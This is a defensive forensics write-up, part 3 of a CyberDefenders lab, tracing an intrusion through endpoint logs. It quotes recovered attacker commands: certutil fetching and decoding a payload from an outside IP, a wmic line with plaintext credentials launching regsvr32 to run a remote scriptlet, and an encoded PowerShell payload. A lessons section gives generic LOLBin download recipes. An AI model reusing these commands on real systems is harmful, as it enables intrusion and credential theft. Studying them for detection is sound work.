---
layout: post
title: CyberDefenders CyberCorp Case 2 - Write-Up Part 3
subtitle: Final Part
tags: [DFIR, howto, lab, windows]
---

Finishing solving the [CyberCorp Case 2](https://cyberdefenders.org/blueteam-ctf-challenges/75) challenge from [CyberDefenders](https://cyberdefenders.org/).

This is Part 3. Checkout [Part 1]({{ site.baseurl }}{% link _posts/2022-06-05-cyberdefenders-cybercorp2-part1.md %}) and [Part 2]({{ site.baseurl }}{% link _posts/2022-06-25-cyberdefenders-cybercorp2-part2.md %}) for more details on the challenge.


## Challenge Questions (11-15)

### 11. From where did the attacker downloaded the Active Directory collection utility?
> As a result of running a malicious code, which we talk about in questions 9 and 10, the attacker got a shell on the compromised host. Using this access, the attacker downloaded the Active Directory collection utility to the host in an encoded form. Specify a comma-separated, non-spaced link where the encoded version of the utility was downloaded and a SHA256 hash of the decoded version that was directly run by the attacker on the compromised host.

After the C2 was contacted:

```elixir
StartDate: 21-06-2021 at 23:41:56 AND EndDate: Now
```

(+) Exclude DC01 results for now:

```elixir
NOT dev_fqdn: DC01
```

(+) Find file downloaded:

```elixir
event_type: NetworkConnection OR event_type: FileCreate OR event_type: FileOpen
```



Browsing through the logs we have next the first 4 sequence of events we are looking for:
1. A pdf file being opened (`ar 2019 for web.pdf`) @ Jun 21, 2021 @ 23:44:50.000; 

2. A series of file creations coming from `certutil.exe `@ 23:46:10.000, after it established a network connection;

3. A word document @ 23:46:53.000;

4.  A "bloodhound" sight @ 23:48:11.000. Bloodhound is a known Active Directory reconnaissance tool, so stopping here let's go back and evaluate these 4 events.

Looking more carefully at Event 2., `certutil` is seen connecting to `188.135.15.49`.

Opening the log we can see in the field `proc_cmdline` that `certutil` downloaded a file named `chrome_installer.log2`:

```powershell
certutil  -urlcache -f http://188.135.15.49/chrome_installer.log2 C:\Windows\TEMP\chrome_installer.log2:data
```

Now, CertUtil is a known LOLBin used by attackers to download files avoiding common detection capabilities. Attackers usually encode a file and use CertUtil to download it, and then use `certutil -decode` to get the decoded malicious file.

Indeed @ 23:46:17.000 we have the following decode command:

```powershell
certutil  -decode C:\Windows\TEMP\chrome_installer.log2:data C:\Windows\TEMP\svchost.exe
```

It looks like `chrome_installer.log2:data` was decoded and stored as `svchost.exe` (like the legitimate Windows system process) in a temporary folder.

Filtering for `C:\Windows\TEMP\svchost.exe` we can get its SHA256

> eb41b254964fb046656a7312c8547674577c4a2229360cc12f5b1289280b92c3



The final answer is thus:

✅ `http://188.135.15.49/chrome_installer.log2`,eb41b254964fb046656a7312c8547674577c4a2229360cc12f5b1289280b92c3


### 12. What was used to create a memory dump of credentials, and what is the name of the file where it was stored?

> During the post-exploitation process, the attacker used one of the standard Windows utilities to create a memory dump of a sensitive system process that contains credentials of active users in the system. Specify the name of the executable file of the utility used and the name of the memory dump file created, separated by a comma without spaces.

Find file created or used:

```elixir
event_type: FileCreate OR event_type: FileOpen
```

Mere seconds after the event of the last question, we can see `rundll32.exe` creating a file named `dump.bin`

✅ rundll32.exe,dumb.bin


### 13. What credentials were used to compromise one DC?

> Presumably, the attacker extracted the password of one of the privileged accounts from the memory dump we discussed in the previous question and used it to run a malicious code on one of the domain controllers. What account are we talking about? Specify its username and password as the answer in login:password format.

Readjusting our time range for after the dump file:

```elixir
StartDate: 21-06-2021 at 23:50:14 AND EndDate: Now
```

Right away we can see the usage of `findstr.exe` which supports the idea that the attacker looked for the credentials in the dump file.

Let's filter for events related to DC01, coming from the compromised host:

```elixir
(*DC01-* OR *192.168.184.100*) AND dev_fqdn: DESKTOP-BZ202CP.cybercorp.com			
#note the hyphen is important to better filter the results
```

The results shows a series of DNS requests, followed by a `ProcessCreate` at 00:15:15.000 using `ping` with the following command (`cmdline` field):

```powershell
ping  192.168.184.100
```

*Tip:* add this field - `cmdline` - as a column.

With this command, the attacker is making sure they can reach the DC01 from their victim computer.

At 00:21:22.000 another `ProcessCreate` event is recorded, this time using `wmic.exe` with the command:

```powershell
wmic  /node:192.168.184.100 /user:inventory /password:jschindler35 process call create 'regsvr32 /u /n /s /i:http://94.177.253.126:8080/Ec9KoccK.sct scrobj.dll'
```

As we saw in the very first question, WMI event subscription is a common technique to establish persistence. In this case it is being used **remotely** from the victim computer to the DC01.

Lets break apart the command above:

* `wmic` - The WMI command-line (*WMIC*) utility provides a command-line interface for Windows Management Instrumentation (WMI); *Tip:* in Powershell use the command `wmic /?`  to see more information on its parameters.

  * `/node` - servers the alias will operate against

  * `/user` - user to be used during the session

  * `/password` - password to be used for session login. If this parameter wouldn't be used, a prompt would appear for password input. Writing out the password in the command hides the operation (however lets us know for sure what credentials were used).

  * `process call create`  - a common command used to execute a binary from wmic in order to evade defensive counter measures 

    * `regsvr32` - command-line utility to register and unregister OLE controls, such as DLLs and ActiveX controls in the Windows Registry
      * `/u` - Unregister server
      * `/n` - do not call DllRegisterServer; this option must be used with /i
      * `/s` -  Silent; display no message boxes
      * `/i[:cmdline]` -  Call DllInstall passing it an optional [cmdline]; when it is used with /u, it calls dll uninstall
      * `scrobj.dll` - the DLL the `regsvr32` is operating on. This DLL is a Windows (R) Script Component Runtime and is used to create new records and folders in the Windows registry.

    This combination of parameters implements a Application White List (AWL) bypass technique ([**T1218.010**](https://attack.mitre.org/techniques/T1218/010/)), where an attacker uses `regsvr32` to execute code from a **remote** scriptlet (in this case, a `.SCT` script) with `scrobj.dll`.

So, which credentials were used to run this malicious command? Simply see in the command above the parameters `user` and `password`.

✅ inventory:jschindler35


### 14. What are the privileged groups on the DC to which the compromised account is member of?

> A compromised user account is a member of two Built-in privileged groups on the Domain Controller. The first group is the Administrators. Find the second group. Provide the SID of this group as an answer.

First let me show you what an S-ID is and what is its structure.

According to [Microsoft](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers)

> A security identifier (SID) is used to uniquely identify a security principal or security group.

Also,

> Users refer to accounts by using the account name, but the operating system internally refers to accounts and processes that run in the security context of the account by using their security identifiers (SIDs). For domain accounts, the SID of a security principal is created by concatenating the SID of the domain with a relative identifier (RID) for the account.

Essentially, SIDs are used for authentication to allow Windows to uniquely identify accounts in a persistent way. As such, when a user creates an account, an unchangeable string (the SID) will be associated with that account. 

This is also true for built-in accounts. For instance, the SID for the *Administrator* account in Windows always ends in **500**; the SID for the *Guest* account always ends in **501**; the S-1-5-18 SID corresponds to the *LocalSystem* account, the system account that's loaded in Windows before a user logs on, and others.

##### SID example 

`S-1-5-21-1004` has the following structure:


| Indicates that this is a SID | SID specification version number | Identifier authority | Domain or local computer identifier | Account Relative ID (RID) |
| ---------------------------- | -------------------------------- | -------------------- | ----------------------------------- | ------------------------- |
| S                            | 1                                | 5                    | 21                                  | 1004                      |


Let's move on to the logs on the DC and see when account groups were listed for the compromised account:

```elixir
dev_fqdn: DC01-CYBERCORP.cybercorp.com AND event_type: AccountGroupList AND *inventory*
```

Opening one of the 3 results we can see the response of the query:

```powershell
%{S-1-5-21-3899523589-2416674273-2941457644-513}	# DOMAIN_USERS
	%{S-1-1-0}			# EVERYONE - A group that includes all users
  		%{S-1-5-32-544}		# BUILTIN_ADMINISTRATORS
  		%{S-1-5-32-551}		# BACKUP_OPERATORS
  		%{S-1-5-32-545}		# BUILTIN_USERS
  		%{S-1-5-32-554}		# Pre-Windows 2000 Compatible Access
  		%{S-1-5-2}			# NETWORK
  		%{S-1-5-11}			# AUTHENTICATED_USERS
  		%{S-1-5-15}			# THIS_ORGANIZATION
  		%{S-1-5-21-3899523589-2416674273-2941457644-1105}
  		%{S-1-5-64-10}		# NTLM_AUTHENTICATION
  		%{S-1-16-12288}		# ML_HIGH
```

*Note*: See [Microsoft's list](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab) of well-known SID structures to see the mapping I did above between SIDs and their values (commented).

The question is looking for "two **built-in** privileged groups" and it already told us the compromised account belonged to the **Administrator** group. [Microsoft's docs](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory) on privileged accounts, tell us of the Backup Operators group:

> Backup Operators can override security restrictions for the sole purpose of backing up or restoring files.

So our answer is:

✅ S-1-5-32-551


### 15. What is the IP address of the C2 contacted by a reverse shell on the DC?

> As a result of malicious code execution on the domain controller using a compromised account, the attacker got a reverse shell on that host. This shell used a previously not seen IP address as the command center. Specify its address as the answer.

Starting from the time the malicious `WMIC` was executed in DC01 (Jun 22, 2021 @ 00:21:22.000) let's see what happened next.

```elixir
dev_fqdn: DC01-CYBERCORP.cybercorp.com
```

Immediately there is a PowerShell script accessing `lsass.exe` (`event_type = ProcessAccess`) leveraging a base64 encoded string in its command line:

```powershell
'H4sIADES+14CA7VWa2+bSBT9nEj5D6iyBCiOjV03yUaqtIAhxrVTU2z8qlVhGMPEw6MwxCbd/ve9Y0OaqmnVrrQIiXnc57ln5rLJI5fiOOLc8Sfuy9npychJnZATau51nauF7iUST05guZYlLp1zbzlhKSdJNw4dHK1ubtQ8TVFEj/PGLaJylqFwTTDKBJH7h5sGKEUX79f3yKXcF672qXFL4rVDSrFCddwAcRdy5LG9Qew6LJiGlRBMBf7jR15cXrRWDe1z7pBM4K0ioyhseITwIvdVZA7HRYIEfojdNM7iDW1McfS63ZhEmbNBd2DtAQ0RDWIv40VIA94U0TyNuGNCzMJxX+BhOEpjV/a8FGUZX+eWzPZytfpbWJaOP+QRxSFqGBFFaZxYKH3ALsoaPSfyCPqANivQsmiKI38liiD2EG+RUItyQurcn5gR7tCugu13lYTnSiA1oqlYh0q+lOgw9nKCjqr8C5FC+UV4KgoAdF/PTs9ONxVbvOI5WWB0sjyMEcQmjOIMH6TeclKdG4ITh8ZpAdPaOM2RuHpClqt9dus/125VoiDoZrCwtGPsrUChrGVto07MkG38nJRdtMER6haRE2K34p3wEsBoQ9AhvUYldgcxCXy5gbwuIsh3KEOM1fkHNS3E9ElXyTHxUCq7UKQMooL6id8HcyyCwBvREIUA0HEOxKttgO2oki4ZXlTe2RyEeJU4WVbnRjkcN7fOWcghyKtzcpThckvOaXwY8t/CHeaEYtfJaGVuJT4BWTpU4yijae5C0SD5sZUgFzuEYVHnethDSmFhv3LMv4iE6hAChwAsPUAlYIUhYFFGhRRihLKLDQtRI0wICkHicOx14vhwyEuiH5jj+MjjfwiwIvKRtQyLCoRn4UGBLRLTOmfjlML1wXB1s//i+9mlcYxCTVFZB6E6GUuloIzRtfU9o2OJyCH/lELuehqHipOhy87xehBeNTXcfTPqxo8yPJr+wbQVa2IvjKHXJ5ZBrbmGB5MgMHDL8GFeTDR/RKXk3Xjc61vdnpx298FGNjJD6ymF2VJkt4ev7L4ymYAeVgfm/d6QPSX0Z/5c3RmjYGaAI3XgGz58FSNwFWkh+YqkqwNLCTQsyb5l9sxOa2E0r4mCHy3DknvTJ39PfrROpzfbj+W7YV8O9Pee3mrrB/0t019sbwdd7TB32dycZxrWwI+mz007QFM7UaaavjDtxPDPd75pD5odPVBg3cD7QWI14Wm1+g+R9zgk149DCNe0F32MFoaPCl82ZdmaR8Ra71RZ7V49JHPJ2OoTWNuOjWhvrpOhV8x7zb/sIUZJLJuaLOsEjmMoO7tuszWN35n2G3OiSftiIu132n1zp+H+blt+J7eXl35z0xk1bcuIek6gQLxFv7PF/XPYCx1bmm+aNsOvq0XNx2hGnJHaism62Zrg7pWiGBj174Yu+axAzmDjjbmO1bYbbCAmw782/VkctZ0t2J36MkQH+UGdN30DdJSc4O3kfMZs9XdS2N9LLM6wfw2xtcsYZBoZsybEJ/e6lhrdWsas7SFdaZ67b18xygJna1vvGRN/1j2GTpoFDgGGQleorgQ9TvXyph/FmGkIAvs/2KI0QgTaKzTg6ljJhMQu6zPQEqDDHfsOa4MTGL5uvzgSuSdB8VvzqZZubhYQIhzU9X1jgCKfBnVp/1qSoJdI+44E6f1+UmqcFAIYqrNOBIgcrZKDVZGd21p6dfW/wlTeFQF8vF/D9G3tF7u/BZ1UZ6n+sPj9wh/h+KdZTx1MQdCCm46gY5t9KfmSDs9+QKAcUO1N+bBfyPc5vbiD35Kz038BKGgg/awKAAA='
```

Decoding this we can extract its SHA1 (use [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)SHA1(80)&input=J0g0c0lBREVTKzE0Q0E3VldhMitiU0JUOW5FajVENml5QkNpT2pWMDN5VWFxdElBaHhyVlRVMno4cWxWaEdNUEV3Nk13eENiZC92ZTlZME9hcW1uVnJyUUlpWG5jNTdsbjVyTEpJNWZpT09MYzhTZnV5OW5weWNoSm5aQVRhdTUxbmF1RjdpVVNUMDVndVpZbExwMXpiemxoS1NkSk53NGRISzF1YnRROFRWRkVqL1BHTGFKeWxxRndUVERLQkpIN2g1c0dLRVVYNzlmM3lLWGNGNjcycVhGTDRyVkRTckZDZGR3QWNSZHk1TEc5UWV3NkxKaUdsUkJNQmY3alIxNWNYclJXRGUxejdwQk00SzBpb3loc2VJVHdJdmRWWkE3SFJZSUVmb2pkTk03aURXMU1jZlM2M1poRW1iTkJkMkR0QVEwUkRXSXY0MFZJQTk0VTBUeU51R05Dek1KeFgrQmhPRXBqVi9hOEZHVVpYK2VXelBaeXRmcGJXSmFPUCtRUnhTRnFHQkZGYVp4WUtIM0FMc29hUFNmeUNQcUFOaXZRc21pS0kzOGxpaUQyRUcrUlVJdHlRdXJjbjVnUjd0Q3VndTEzbFlUblNpQTFvcWxZaDBxK2xPZ3c5bktDanFyOEM1RkMrVVY0S2dvQWRGL1BUczlPTnhWYnZPSTVXV0Iwc2p5TUVjUW1qT0lNSDZUZWNsS2RHNElUaDhacEFkUGFPTTJSdUhwQ2xxdDlkdXMvMTI1Vm9pRG9ackN3dEdQc3JVQ2hyR1Z0bzA3TWtHMzhuSlJkdE1FUjZoYVJFMkszNHAzd0VzQm9ROUFodlVZbGRnY3hDWHk1Z2J3dUlzaDNLRU9NMWZrSE5TM0U5RWxYeVRIeFVDcTdVS1FNb29MNmlkOEhjeXlDd0J2UkVJVUEwSEVPeEt0dGdPMm9raTRaWGxUZTJSeUVlSlU0V1ZiblJqa2NON2ZPV2NnaHlLdHpjcFRoY2t2T2FYd1k4dC9DSGVhRVl0ZkphR1Z1SlQ0QldUcFU0eWlqYWU1QzBTRDVzWlVnRnp1RVlWSG5ldGhEU21GaHYzTE12NGlFNmhBQ2h3QXNQVUFsWUlVaFlGRkdoUlJpaExLTERRdFJJMHdJQ2tIaWNPeDE0dmh3eUV1aUg1amorTWpqZndpd0l2S1J0UXlMQ29SbjRVR0JMUkxUT21mamxNTDF3WEIxcy8vaSs5bWxjWXhDVFZGWkI2RTZHVXVsb0l6UnRmVTlvMk9KeUNIL2xFTHVlaHFIaXBPaHk4N3hlaEJlTlRYY2ZUUHF4bzh5UEpyK3diUVZhMkl2aktIWEo1WkJyYm1HQjVNZ01IREw4R0ZlVERSL1JLWGszWGpjNjF2ZG5weDI5OEZHTmpKRDZ5bUYyVkprdDRldjdMNHltWUFlVmdmbS9kNlFQU1gwWi81YzNSbWpZR2FBSTNYZ0d6NThGU053RldraCtZcWtxd05MQ1RRc3liNWw5c3hPYTJFMHI0bUNIeTNEa252VEozOVBmclJPcHpmYmorVzdZVjhPOVBlZTNtcnJCLzB0MDE5c2J3ZGQ3VEIzMmR5Y1p4cld3SSttejAwN1FGTTdVYWFhdmpEdHhQRFBkNzVwRDVvZFBWQmczY0Q3UVdJMTRXbTErZytSOXpnazE0OURDTmUwRjMyTUZvYVBDbDgyWmRtYVI4UmE3MVJaN1Y0OUpIUEoyT29UV051T2pXaHZycE9oVjh4N3piL3NJVVpKTEp1YUxPc0VqbU1vTzd0dXN6V04zNW4yRzNPaVNmdGlJdTEzMm4xenArSCtibHQrSjdlWGwzNXoweGsxYmN1SWVrNmdRTHhGdjdQRi9YUFlDeDFibW0rYU5zT3ZxMFhOeDJoR25KSGFpc202MlpyZzdwV2lHQmoxNzRZdStheEF6bURqamJtTzFiWWJiQ0Ftdzc4Mi9Wa2N0WjB0MkozNk1rUUgrVUdkTjMwRGRKU2M0TzNrZk1aczlYZFMyTjlMTE02d2Z3Mnh0Y3NZWkJvWnN5YkVKL2U2bGhyZFdzYXM3U0ZkYVo2N2IxOHh5Z0puYTF2dkdSTi8xajJHVHBvRkRnR0dRbGVvcmdROVR2WHlwaC9GbUdrSUF2cy8yS0kwUWdUYUt6VGc2bGpKaE1RdTZ6UFFFcURESGZzT2E0TVRHTDV1dnpnU3VTZEI4VnZ6cVpadWJoWVFJaHpVOVgxamdDS2ZCblZwLzFxU29KZEkrNDRFNmYxK1VtcWNGQUlZcXJOT0JJZ2NyWktEVlpHZDIxcDZkZlcvd2xUZUZRRjh2Ri9EOUczdEY3dS9CWjFVWjZuK3NQajl3aC9oK0tkWlR4MU1RZENDbTQ2Z1k1dDlLZm1TRHM5K1FLQWNVTzFOK2JCZnlQYzV2YmlEMzVLejAzOEJLR2dnL2F3S0FBQT0n) ) and run it by VirusTotal:


![image-20220629180015590](/assets/img/image-20220629180015590.png)


As such, we can conclude the PowerShell script is trying to execute a malicious gzip. Continuing following this thread let's see what else this PowerShell Script is doing (by its process id):

```elixir
dev_fqdn: DC01-CYBERCORP.cybercorp.com AND proc_id: 4460			# the process of the PowerShell Script
```

![image-20220629180724838](/assets/img/image-20220629180724838.png)


In the results (image above) we can see this PowerShell process also injects code in `svchost.exe` and then proceeds to establish a connection to `190.150.52.34`.

Finally,

✅ 190.150.52.34

## Lessons Learned

Before wrapping up an investigation it is always a good idea to note down lessons learned. This section is always a good reminder of our own takeaways that could be useful for future investigations.

In this case we can take note of:

* [Internet Explorer COM object](#internet-explorer-com-object)
* [LOLBins](#lolbins)
* [Parent PID Spoofing Technique](#parent-pid-spoofing-technique)
* [Interesting queries](#interesting-queries)



### Internet Explorer COM object

From CyberPolygon's [article](https://cyberpolygon.com/materials/hunting-for-advanced-tactics-techniques-and-procedures-ttps/):

> This COM object is implemented as a dll library C:\Windows\System32\ieproxy.dll. When loaded to the address space of the client process, this library enables interaction with the internet resources, including the downloading of files on behalf of the Internet Explorer browser. In other words, endpoint monitoring tools will see the network activity initiated by the client application (e.g. from a Microsoft Office document macro) as that initiated by Internet Explorer (C:\Program Files (x86)\Internet Explorer\iexplore.exe) process, rather than a client application using a COM object. 

This `ieproxy.dll` is a really interesting DLL to look for.





### LOLBins

LOLBins is the abbreviated term for **Living Off the Land Binaries**. These are simply binaries local to the operating system, however attackers use them for their malicious activities.

`PowerShell` is often the *de facto* tool of choice by attackers for LOLbins that allow to download files from remote places, but as defenders have become aware of this, attackers have turn to other admins tools that are not so closely monitored. Examples of this are:

* `CertUtil`. This is an admin tool used to manipulate certification authority (CA) data and components.

```powershell
# Basic usage for downloading a file
certutil.exe -urlcache -f UrlAddress Output-File-Name.txt
# Decoding the downloaded file
certutil.exe -decode Output-File-Name bad.gzip
```

* `desktopimgdownldr.exe`. Located in `c:\windows\system32\desktopimgdownldr.exe` is used to set lock screen or desktop background images.

```powershell
# Basic usage
desktopimgdownldr /lockscreenurl:https://domain.com:8080/file.ext /eventName:randomname
```

Checkout GitHub project [LOLBas](lolbas-project.github.io) to look for known LOLBins that can be used to download remote payloads (use the query "`/download`").


### Parent PID Spoofing Technique

"Good" attackers are always findings ways to hide or mask their activity as normal in order to not raise the hunter's suspicion.

Hiding their activity on behalf of another process, specially a Windows LOLBin, it's a preferred way.

Read about this technique on Mitre [T1134.004](https://attack.mitre.org/techniques/T1134/004/).



### Interesting Queries

* Windows event ID `5308 (Microsoft-Windows-Group-Policy)` lists domain controller details:
```elixir
event_id:5308
```
 
* If a file was downloaded then we can use a query like:
```elixir
event_type: NetworkConnection OR event_type: FileCreate OR event_type: FileOpen
```
In this way, we can see every creation or opening files together with network connections.




## Next Steps
If you would like to take this exercise further, the next mandatory step would be to create a report.

A good and clear report where you can showcase your findings is an important part for the success of an investigation. 

The report should be written in a way that makes sense for anyone who needs to read it, regardless of technical background. For instance, the report can be used for the incident response team to mitigate further issues, or even leveraged by the CEO to be used for insurance purposes.

In this case, we can take everything relevant that was found during the investigation and gather it in a report.

Here's a suggestion of a structure for a general digital forensic report:

1. Scope (requested by / provided by / relevant dates)
2. Executive Summary
3. Proposed Mitigation
4. The investigation itself. This should include at least:
   * Timeline of attack
   * IOCs
   * Analyses



And this is it! I had fun 😁 hope you did too 😊

